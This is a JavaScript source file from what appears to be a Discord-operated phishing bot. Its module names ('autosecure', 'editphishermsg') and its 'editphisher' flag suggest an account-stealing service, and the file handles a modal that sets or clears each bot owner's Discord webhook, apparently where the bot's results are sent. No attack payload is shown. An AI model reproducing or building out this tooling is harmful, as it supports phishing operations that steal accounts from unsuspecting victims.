const { isvalidwebhook } = require("../../../autosecure/utils/process/helpers");
const editphishermsg = require("../../../autosecure/utils/responses/editphishermsg");
const { queryParams } = require("../../../db/database");

module.exports = {
  name: "changewebhookmodal",
  editphisher: true,
  callback: async (client, interaction) => {
    try {
      const [t, botnumber, ownerid] = interaction.customId.split("|");

             await interaction.deferUpdate();

            let webhook = interaction.components[0].components[0].value.trim();

      if (!webhook || webhook.length === 0) {
        await queryParams(
          `UPDATE autosecure SET webhook = NULL WHERE user_id = ? AND botnumber = ?`,
          [ownerid, botnumber]
        );
        const settingsResponse = await editphishermsg(botnumber, ownerid, interaction.user.id);
        settingsResponse.content = `✅ Removed your webhook!`;
        return interaction.editReply(settingsResponse);
      }

if (!(await isvalidwebhook(webhook))) {
  await interaction.editReply({
    content: `❌ Invalid URL! Please enter a valid webhook URL.`,
    ephemeral: true
  });
  return;
}


      await queryParams(
        `UPDATE autosecure SET webhook = ? WHERE user_id = ? AND botnumber = ?`,
        [webhook, ownerid, botnumber]
      );

      const settingsResponse = await editphishermsg(botnumber, ownerid, interaction.user.id);
      settingsResponse.content = `✅ Set your webhook.`;
      return interaction.editReply(settingsResponse);

    } catch (error) {
      console.error("Error in changewebhookmodal:", error);
      return interaction.editReply({
        content: `❌ An unexpected error occurred.`,
        ephemeral: true
      });
    }
  }
};

const isValidUrl = (urlString) => {
  try {
    new URL(urlString);
    return true;
  } catch {
    return false;
  }
};

const isValidWebhookUrl = (url) => {
  const regex = /^https:\/\/(canary\.|ptb\.)?discord(app)?\.com\/api\/webhooks\/\d+\/[\w-]+$/;
  return regex.test(url);
};
